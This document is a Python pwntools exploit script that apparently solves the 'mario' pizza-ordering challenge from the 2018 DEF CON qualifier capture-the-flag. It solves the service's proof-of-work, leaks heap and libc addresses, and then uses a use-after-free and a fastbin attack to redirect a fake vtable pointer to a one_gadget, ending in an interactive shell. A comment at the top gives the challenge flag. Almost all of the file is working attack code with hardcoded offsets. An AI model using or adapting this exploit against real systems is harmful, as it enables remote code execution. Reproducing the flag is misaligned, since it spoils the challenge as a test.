#!/usr/bin/env python
# coding: utf-8

from pwn import *

# OOO{cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs}

local = False

if local:
	p = process('./mario')
else:
	p = remote('83b1db91.quals2018.oooverflow.io', 31337)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_local64 = {
	'base': 0x0,
	'__libc_start_main': 0x20740,
	'system': 0x45390,
	'unsorted_bin': 0x3c3b78,
	'free_hook': 0x3c57a8,
	'realloc_hook': 0x3c3b08,
	'one_gadget': 0x4526a
}

libc_remote = {
	'base': 0x0,
	'unsorted_bin': 0x3c4b78,
	'system': 0x45390,
	'one_gadget': 0x4526a
}

if local:
	libc = libc_local64
else:
	libc = libc_remote

heap = {
	'base': 0x0,
	'leaked': 0x13150,
	'pizza_chunk': 0x12210,
	'fake_vptr': 0x12268,
	'fake_func': 0x12270
}

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base

def order(in_list):
	ru('Choice: ')
	sel('O')
	ru('pizzas? ')
	sel('1')
	ru('ingredients? ')
	sel(str(len(in_list)))
	for i in in_list:
		ru(': ')
		sel(i)

def cook(exp):
	ru('Choice: ')
	sel('C')
	ru('explain: ')
	sel(exp)

def new(name):
	ru('Choice: ')
	sel('N')
	ru('name? ')
	sel(name)

def leave():
	ru('Choice: ')
	sel('L')

def login(name):
	ru('Choice: ')
	sel('L')
	ru('name? ')
	sel(name)

def pow_hash(challenge, solution):
	return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
	h = pow_hash(challenge, solution)
	return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
	candidate = 0
	while True:
		if check_pow(challenge, n, candidate):
			return candidate
		candidate += 1

if not local:
	ru('Challenge: ')
	chal = rud('\n')
	ru('n: ')
	n = int(rud('\n'))
	sel(str(solve_pow(chal,n)))

new('LotusA')
leave()
new('LotusB')

# 1 approved pizza and 16 crimial pizza, the buffer will be freed

order(['\xF0\x9F\x8D\x85' * 2 ])
for i in range(16):
	order(['\xF0\x9F\xF0\x9F', '\x8D\x8D\x8D\x8D'])
cook('C' * (0x100 - 10))

# leak heap address
ru('Choice: ')
sel('Y')
ru('Choice: ')
sel('W')
ru('what he had to say: ')
leaked_heap = pick64(rud('\n'))
print('[+] leaked heap: %#x' % leaked_heap)
set_base(heap, 'leaked', leaked_heap)
print('[+] heap base: %#x' % heap['base'])

# clean unsorted_bin, then there is only a chunk in it
new('D' * (0x90 - 10))
leave()

# leak libc
ru('Choice: ')
sel('W')
ru('what he had to say: ')
unsorted_bin = pick64(rud('\n'))
print('[+] unsorted bin: %#x' % unsorted_bin)
set_base(libc, 'unsorted_bin', unsorted_bin)
print('[+] libc base: %#x' % libc['base'])

	
new('LotusC')
order(['\xF0\x9F\x8D\x85' * 2])
cook('E' * (0x100 - 10))
leave()

# UAF, fastbin attack
new('LotusD')
order(['\xF0\x9F\x8D\x85' * 2 ])
for i in range(16):
	order(['\xF0\x9F\xF0\x9F', '\x8D\x8D\x8D\x8D'])
cook('FFFF')

ru('Choice: ')
sel('P')
ru('yourself: ')
sel(p64(heap['pizza_chunk']) + p64(heap['fake_func']) + p64(libc['one_gadget'])[:-1])

login('D' * (0x90 - 10))
cook(p64(heap['fake_vptr']).strip('\0'))
cook(p64(heap['fake_vptr']).strip('\0'))

leave()
login('LotusC')
ru('Choice: ')
sel('A')

p.interactive()
